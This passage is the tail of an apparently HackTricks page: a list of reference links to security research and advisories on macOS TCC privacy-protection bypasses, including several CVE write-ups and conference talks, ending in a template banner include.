- [11] [Zero-Day TCC bypass discovered in XCSSET malware](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [12] [OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [13] [New macOS vulnerability, "powerdir," could lead to unauthorized user data access](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [14] [Change home directory and bypass TCC aka CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [15] [Play the music and bypass TCC aka CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [16] [How to rob a (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [17] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [18] [Kandji - Uncovering Apple Vulnerabilities: diskarbitrationd and storagekitd Audit Part 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [19] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks & CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)

{{#include ../../../../../banners/hacktricks-training.md}}
